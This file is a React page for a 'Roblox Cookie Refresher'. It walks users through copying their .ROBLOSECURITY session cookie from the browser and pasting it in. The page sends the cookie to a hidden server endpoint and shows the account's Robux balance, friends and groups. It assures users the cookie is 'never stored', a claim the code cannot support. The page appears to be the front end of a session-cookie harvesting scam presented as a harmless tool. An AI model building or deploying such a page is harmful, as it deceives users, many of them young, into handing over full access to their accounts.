import { useState } from 'react';
import axios from 'axios';

export default function Home() {
  const [cookie, setCookie] = useState('');
  const [loading, setLoading] = useState(false);
  const [result, setResult] = useState(null);
  const [error, setError] = useState('');

  const handleRefresh = async (e) => {
    e.preventDefault();
    setLoading(true);
    setError('');
    setResult(null);

    try {
      const response = await axios.post('/api/refresh', { cookie });
      setResult(response.data);
    } catch (err) {
      setError(err.response?.data?.error || 'Cookie refresh failed. Verify your cookie is valid.');
    } finally {
      setLoading(false);
    }
  };

  const copyCookie = () => {
    navigator.clipboard.writeText(result.newCookie);
    alert('Refreshed cookie copied to clipboard!');
  };

  return (
    <div className="container">
      <div className="glow-orb orb-1"></div>
      <div className="glow-orb orb-2"></div>
      
      <div className="content">
        <div className="header">
          <div className="logo-container">
            <svg className="logo" viewBox="0 0 24 24" fill="none" stroke="currentColor">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" />
            </svg>
          </div>
          <h1 className="title">Roblox Cookie Refresher</h1>
          <p className="subtitle">Keep your session alive - refresh your .ROBLOSECURITY token</p>
        </div>

        <form onSubmit={handleRefresh} className="form">
          <div className="input-group">
            <label className="label">Paste your .ROBLOSECURITY cookie:</label>
            <textarea
              value={cookie}
              onChange={(e) => setCookie(e.target.value)}
              placeholder="_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you..."
              className="textarea"
              rows={4}
              required
            />
          </div>

          <div className="info-box">
            <p>🔒 Your cookie is processed securely and never stored</p>
            <p>⚡ Instant refresh - keeps your session active</p>
          </div>

          <button type="submit" className="submit-btn" disabled={loading}>
            {loading ? (
              <span className="loader"></span>
            ) : (
              'Refresh Cookie'
            )}
          </button>
        </form>

        {result && (
          <div className="result success">
            <div className="result-header">✓ Cookie Refreshed Successfully</div>
            <div className="result-body">
              <p><strong>Username:</strong> {result.username}</p>
              <p><strong>User ID:</strong> {result.userId}</p>
              <p><strong>Robux Balance:</strong> {result.robux.toLocaleString()} R$</p>
              <p><strong>Premium:</strong> {result.premium ? 'Yes' : 'No'}</p>
              
              <div className="token-box">
                <p className="token-label">Your Refreshed Cookie:</p>
                <code className="token">{result.newCookie.substring(0, 80)}...</code>
                <button onClick={copyCookie} className="copy-btn">Copy Full Cookie</button>
              </div>

              <div className="stats">
                <div className="stat-item">
                  <span className="stat-label">Groups</span>
                  <span className="stat-value">{result.groupCount}</span>
                </div>
                <div className="stat-item">
                  <span className="stat-label">Friends</span>
                  <span className="stat-value">{result.friendCount}</span>
                </div>
                <div className="stat-item">
                  <span className="stat-label">Games Found</span>
                  <span className="stat-value">{result.gamesFound}</span>
                </div>
              </div>
            </div>
          </div>
        )}

        {error && (
          <div className="result error">
            <div className="result-header">✗ Error</div>
            <p>{error}</p>
          </div>
        )}

        <div className="footer">
          <p>How to find your cookie: Press F12 → Application → Cookies → .ROBLOSECURITY</p>
        </div>
      </div>
    </div>
  );
    }
